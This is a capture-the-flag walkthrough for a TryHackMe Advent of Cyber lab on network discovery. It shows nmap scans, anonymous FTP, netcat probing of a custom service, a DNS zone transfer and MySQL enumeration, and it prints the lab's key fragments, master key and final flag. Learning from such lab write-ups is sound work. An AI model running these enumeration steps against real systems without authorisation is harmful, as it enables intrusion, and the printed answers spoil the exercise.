
# 🛰️ Day 07 – Network Discovery: Scan-ta Clause

**Platform**: TryHackMe – *Advent of Cyber 2025*  
**Focus**: Network enumeration, FTP, custom service probing, DNS zone transfer, MySQL enumeration

---

## 🧠 Target Info

```txt
Target Hostname: tbfc-devqa01
Target IP: 10.66.167.227
```

---

## 🗝️ Keys Discovered

```txt
KEY1: 3aster_
KEY2: 15_th3_
KEY3: n3w_xm45

MasterKey: 3aster_15_th3_n3w_xm45
```

---

## 🔍 Enumeration Steps

### 1. Ping Target

```bash
ping -4 10.66.167.227
```

Target is responsive with ~29ms latency.

---

### 2. Fast Port Discovery

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.66.167.227 | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',')
echo $ports
# Output: 22,80,21212,25251
```

---

### 3. Full TCP Scan

```bash
sudo nmap -Pn -A -p$ports 10.66.167.227 -oN tcp.nmap
```

**Findings:**

- `22/tcp` – OpenSSH 9.6p1 (Ubuntu)
- `80/tcp` – nginx (HTTP Title: TBFC QA — EAST-mas)
- `21212/tcp` – vsftpd 3.0.5 (Anonymous FTP login allowed)
- `25251/tcp` – TBFC maintd v0.2 (custom command service)

---

### 4. UDP Scan

```bash
sudo nmap -Pn -sU --top-ports 100 10.66.167.227 -oN udp.nmap
```

- `53/udp` – DNS (open)

---

## 🔑 Key Collection

### 🗝️ KEY1: FTP

```bash
ftp 10.66.167.227 21212
# Login: anonymous
ftp> get tbfc_qa_key1
cat tbfc_qa_key1
# KEY1: 3aster_
```

---

### 🗝️ KEY2: Custom TCP Service

```bash
nc -nv 10.66.167.227 25251

# Output:
TBFC maintd v0.2
Type HELP for commands.
> help
> status
> get key
# KEY2: 15_th3_
```

---

### 🗝️ KEY3: DNS

```bash
dig @10.66.167.227 AXFR
dig @10.66.167.227 TXT key3.tbfc.local +short
# "KEY3:n3w_xm45"
```

---

## 🧬 Master Key

All three keys combined:

```txt
MasterKey: 3aster_15_th3_n3w_xm45
```

Use on:  
**http://10.66.167.227/terminal**

---

## 💻 Admin Terminal Access

```bash
whoami
# tbfcapp

ss -tunlp
# Port Discovery Confirms:
# - mysql: 127.0.0.1:3306
# - local web: 127.0.0.1:8000
# - open http/ssh/ftp/maintd externally
```

---

## 🛢️ MySQL Access

MySQL is running locally on port 3306.

```sql
SELECT USER(), CURRENT_USER(), VERSION();

SHOW DATABASES;
USE tbfcqa01;
SHOW TABLES;
DESCRIBE flags;
SELECT * FROM flags;
```

🟩 **Flag Found**:
```txt
THM{4ll_s3rvice5_d1sc0vered}
```

---

## ✅ Completion Timestamp

```txt
2025-12-17 07:03:13 EST -- COMPLETE
```
